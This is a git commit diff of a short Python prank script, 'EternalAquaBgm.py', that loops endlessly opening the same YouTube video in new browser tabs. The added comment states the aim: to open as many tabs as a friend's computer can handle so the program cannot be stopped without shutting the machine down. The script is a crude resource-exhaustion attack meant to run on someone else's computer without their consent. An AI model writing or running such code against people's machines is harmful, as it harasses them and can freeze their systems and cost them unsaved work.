17f477adceceacb27fcfc2f3e39b9e3492b909c2
DaffaXD <79232562+DaffaXD@users.noreply.github.com>
2021-02-18 17:02:30 +0700

    Update EternalAquaBgm.py

--- TrollingNonSimps/EternalAquaBgm.py
+++ TrollingNonSimps/EternalAquaBgm.py
@@ -1,8 +1,11 @@
 import webbrowser
 
+#Purpose: To make as many tabs as your friend's computer can handle with Aqua BGM playing on each tabs and you cant shutdown the program unless you shutdown the computer.
+
 while True:
     #will loop for eternity until he/she presses Ctrl + C (which they cant because it will keep opening another tabs >:) )
     webbrowser.open('https://www.youtube.com/watch?v=kXma6hOqUIE')
+    
     #Baqua BGM for lyfe h3h3h3hh3h
     
     #DaffaXD
